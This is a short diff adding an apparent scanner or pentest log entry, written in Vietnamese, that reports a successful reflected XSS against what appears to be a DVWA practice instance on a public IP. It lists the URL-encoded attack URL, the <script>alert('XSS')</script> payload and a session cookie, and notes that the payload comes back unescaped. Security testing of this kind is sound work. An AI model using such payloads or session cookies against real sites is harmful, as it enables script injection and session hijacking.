@@ -1,0 +1,5 @@
+XSS Reflected thành công - payload reflect trong response.
+      - URL     : http://13.250.120.1:80/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
+      - Payload : <script>alert('XSS')</script>
+      - Cookie  : security=low; PHPSESSID=g7glvapkv8r53se146kfd2bg12
+      - Reflect : payload xuất hiện unescaped trong HTML
